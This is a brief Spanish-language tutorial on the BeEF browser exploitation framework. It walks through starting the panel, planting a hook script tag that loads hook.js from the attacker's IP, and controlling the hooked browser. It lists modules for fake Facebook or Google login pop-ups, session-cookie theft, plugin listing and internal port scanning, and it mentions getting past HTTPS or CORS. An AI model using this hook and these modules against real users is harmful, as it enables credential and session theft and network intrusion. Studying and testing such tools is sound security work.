Flujo de Trabajo
Iniciar BeEF: Se ejecuta el servidor y se accede al panel de control (http://127.0.0.1:3000/ui/panel).

Hooking: El objetivo debe visitar una web que contenga el script de "gancho" (hook).

<script src="http://[Tu_IP]:3000/hook.js"></script>

Control: Una vez el navegador "pica el anzuelo", aparece en tu panel y puedes ejecutar comandos.

Comandos y Módulos Comunes en el Panel
Social Engineering:

Pretty Theft: Muestra una ventana falsa de login (Facebook, Google) para robar credenciales.

Host:

Get Cookies: Roba las cookies de sesión del usuario.

Get Installed Plugins: Lista qué extensiones tiene el navegador.

Network:

Port Scanner: Escanea la red interna de la víctima desde su propio navegador.

[!IMPORTANT] Nota de seguridad: Recuerda que para que BeEF funcione en entornos modernos, a veces es necesario evadir protecciones como el HTTPS o políticas de CORS, dependiendo de la técnica de entrega del "hook".
